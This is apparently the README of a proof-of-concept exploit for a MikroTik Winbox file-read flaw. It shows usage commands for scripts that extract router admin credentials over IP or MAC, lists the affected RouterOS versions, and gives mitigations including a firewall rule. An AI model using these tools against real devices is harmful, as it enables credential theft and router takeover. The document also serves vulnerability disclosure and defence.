# WinboxExploit
Proof of Concept of Winbox Critical Vulnerability  
Arbitrary file read

# Blogpost
https://n0p.me/winbox-bug-dissection/


## How to use
Winbox (TCP/IP)
```
$ python3 WinboxExploit.py 172.17.17.17

User: admin
Pass: Th3P4ssWord

```  

MAC server Winbox (Layer 2)  
You can extract files even if the device doesn't have an IP address :-)
```
$ python3 MACServerDiscover.py
Looking for Mikrotik devices (MAC servers)

    aa:bb:cc:dd:ee:ff 

    aa:bb:cc:dd:ee:aa

```
```
$ python3 MACServerExploit.py aa:bb:cc:dd:ee:ff

User: admin
Pass: Th3P4ssWord

```
## Vulnerable versions
all versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20) are vulnerable ..

## Mitigation Techniques
- Update your RouterOS to the last version or Bugfix version 
- Do not use Winbox and disable it :| it's nothing just a GUI for NooBs ..
- you may use some Filter Rules (ACL) to deny anonymous accesses to the Router 
```
ip firewall filter add chain=input in-interface=wan protocol=tcp dst-port=8291 action=drop
```

Enjoy!
